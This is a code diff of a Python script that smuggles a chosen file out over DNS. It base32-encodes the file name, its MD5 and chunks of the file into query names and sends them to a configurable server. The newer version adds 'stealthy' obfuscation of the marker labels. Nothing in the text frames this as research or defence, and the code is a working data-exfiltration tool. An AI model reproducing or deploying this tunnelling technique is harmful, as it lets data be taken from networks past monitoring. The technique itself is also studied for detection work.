@@ -3,68 +3,74 @@ import base64
 import hashlib
 import os
 
-# DNS server domain name
-DNS_SERVER = "dnsserver.example.com"
+DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server
 DNS_PORT = 53
+domain = "fileupload.example.com"  # Domain to use
 
-# Assign the domain directly here
-domain = "fileupload.example.com"
-
-# File to send
-file_path = "path/to/your/file.pdf"  # Replace with the actual file path
-file_name = os.path.basename(file_path)  # Extracts the file name with extension
-
-def chunk_file(file_data, chunk_size=255):
-    """Splits the file data into chunks of a given size."""
-    return [file_data[i:i + chunk_size] for i in range(0, len(file_data), chunk_size)]
-
-def send_dns_query(domain):
-    """Sends a DNS query to the server."""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(domain.encode(), (DNS_SERVER, DNS_PORT))
-
-def send_file_info(file_name, file_md5):
-    """Sends the file name and its MD5 hash to the server."""
-    domain = f"{file_name}.{file_md5}.fileinfo.{domain}"
-    send_dns_query(domain)
-
-def send_chunk(chunk, sequence_number):
-    """Sends a chunk of the file as a DNS query."""
-    encoded_chunk = base64.b32encode(chunk).decode('utf-8')
-    domain = f"{encoded_chunk}.chunk{sequence_number}.{domain}"
-    send_dns_query(domain)
-
-def send_end_of_transmission():
-    """Sends a special DNS query to signal the end of the file transmission."""
-    domain = "end.chunk999.{domain}"
-    send_dns_query(domain)
-
-# Calculate the MD5 hash of the file
+# Function to calculate MD5 hash
 def calculate_md5(file_path):
-    md5 = hashlib.md5()
-    with open(file_path, 'rb') as file:
-        while chunk := file.read(4096):
-            md5.update(chunk)
-    return md5.hexdigest()
+    md5_hash = hashlib.md5()
+    with open(file_path, "rb") as f:
+        for byte_block in iter(lambda: f.read(4096), b""):
+            md5_hash.update(byte_block)
+    return md5_hash.hexdigest()
 
-# Compute the MD5 hash of the file
-file_md5 = calculate_md5(file_path)
-print(f"MD5 hash of the original file: {file_md5}")
+# Function to make strings stealthy (base32 encoding)
+def obfuscate_data(data):
+    return base64.b32encode(data.encode()).decode().strip("=")
 
-with open(file_path, "rb") as file:
-    file_data = file.read()
+# Function to send a DNS query
+def send_dns_query(data, server_ip):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto(data.encode(), (server_ip, DNS_PORT))
 
-# Send the file name and MD5 hash to the server
-send_file_info(file_name, file_md5)
+# Function to send file in chunks
+def send_file_chunks(file_path, server_ip, domain):
+    file_size = os.path.getsize(file_path)
+    chunk_size = 512  # Size of each chunk in bytes (adjust as needed)
+    total_chunks = (file_size // chunk_size) + (1 if file_size % chunk_size else 0)
 
-# Chunk the file into smaller pieces
-chunks = chunk_file(file_data)
+    with open(file_path, "rb") as file:
+        for chunk_number in range(total_chunks):
+            chunk_data = file.read(chunk_size)
+            encoded_chunk_data = base64.b32encode(chunk_data).decode().strip("=")
 
-# Send each chunk as a DNS query
-for i, chunk in enumerate(chunks):
-    send_chunk(chunk, i)
+            # Send the chunk with an obfuscated identifier
+            query = f"{encoded_chunk_data}.{obfuscate_data('chunk')}.{chunk_number}.{domain}"
+            print(f"Sending chunk {chunk_number}")
+            send_dns_query(query, server_ip)
 
-# Send the final chunk to signal the end of the file transmission
-send_end_of_transmission()
+# Function to send file information
+def send_file_info(file_name, file_md5, server_ip, domain):
+    # Obfuscate the file name and MD5 hash
+    encoded_file_name = base64.b32encode(file_name.encode()).decode().strip("=")
+    encoded_file_md5 = base64.b32encode(file_md5.encode()).decode().strip("=")
 
-print("File chunks sent successfully.")
+    # Send the obfuscated file info as a DNS query
+    query = f"{encoded_file_name}.{encoded_file_md5}.{obfuscate_data('fileinfo')}.{domain}"
+    print(f"Sending file info: {file_name}, MD5: {file_md5}")
+    send_dns_query(query, server_ip)
+
+# Function to signal end of transmission
+def send_end_signal(server_ip, domain):
+    end_signal = obfuscate_data("zzz") + f".{domain}"
+    print("Sending end of transmission signal")
+    send_dns_query(end_signal, server_ip)
+
+# Main client function
+def send_file(file_path):
+    file_name = os.path.basename(file_path)
+    file_md5 = calculate_md5(file_path)
+
+    # Send file info
+    send_file_info(file_name, file_md5, DNS_SERVER, domain)
+
+    # Send file chunks
+    send_file_chunks(file_path, DNS_SERVER, domain)
+
+    # Signal the end of transmission
+    send_end_signal(DNS_SERVER, domain)
+
+# Example usage
+file_path = input("Enter the file path to send: ")
+send_file(file_path)
